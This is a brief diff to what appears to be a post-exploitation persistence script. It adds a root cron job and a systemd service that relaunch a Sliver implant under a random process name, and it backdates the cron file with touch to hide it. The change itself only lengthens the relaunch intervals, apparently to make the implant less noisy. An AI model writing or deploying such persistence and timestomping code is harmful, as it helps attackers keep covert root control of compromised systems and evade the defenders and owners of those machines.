@@ -82,7 +82,7 @@ service ssh restart >/dev/null 2>&1 || systemctl restart sshd >/dev/null 2>&1
 
 # Cron persistence
 cat <<EOF > /etc/cron.d/mdb
-* * * * * root pgrep -x $RANDOM_BINARY_NAME >/dev/null || $SLIVER_PAYLOAD_PATH >/dev/null 2>&1
+*/5 * * * * root pgrep -x $RANDOM_BINARY_NAME >/dev/null || $SLIVER_PAYLOAD_PATH >/dev/null 2>&1
 EOF
 chmod 644 /etc/cron.d/mdb
 touch -d "12 Jul 2020" /etc/cron.d/mdb
@@ -98,7 +98,7 @@ After=network.target
 Type=simple
 ExecStart=/bin/bash -c 'pgrep -x '"$RANDOM_BINARY_NAME"' >/dev/null || '"$SLIVER_PAYLOAD_PATH"
 Restart=always
-RestartSec=60
+RestartSec=300
 
 [Install]
 WantedBy=multi-user.target
